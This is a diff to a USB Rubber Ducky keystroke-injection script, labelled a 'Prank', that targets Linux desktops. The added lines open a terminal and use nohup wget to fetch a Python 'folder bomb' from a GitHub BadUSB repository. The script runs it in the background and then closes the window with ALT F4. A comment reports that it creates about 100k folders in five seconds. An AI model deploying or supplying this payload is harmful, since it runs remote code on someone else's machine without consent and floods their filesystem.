@@ -4,7 +4,7 @@ REM Target:  Unix-like tested on kubuntu 22.04.
 REM Props: Hak5, PauloVicente89 for the py script I modified for linux and memes
 REM Version: 1.0
 REM Category: Prank
-REM Launches a terminal, background wgets the py script and runs it.
+REM Launches a terminal, background wgets the py script and runs it. It created about 100k folders in about 5 seconds from my testing.
 REM
 DELAY 300
 REM Minimize all windows as that ensures launch happens smoother.
@@ -12,4 +12,6 @@ WINDOWS d
 DELAY 300
 CTRL-ALT t
 DELAY 2000
-STRING nohup wget link && python3 PLTUX.py
+STRING nohup wget https://github.com/FalsePhilosopher/BadUSB-Playground/raw/main/Ducky/USBRubberducky/library/prank/Unix-like/Linux/Folder_Bomb/PLTUX.py && python3 PLTUX.py &
+DELAY 500
+ALT F4
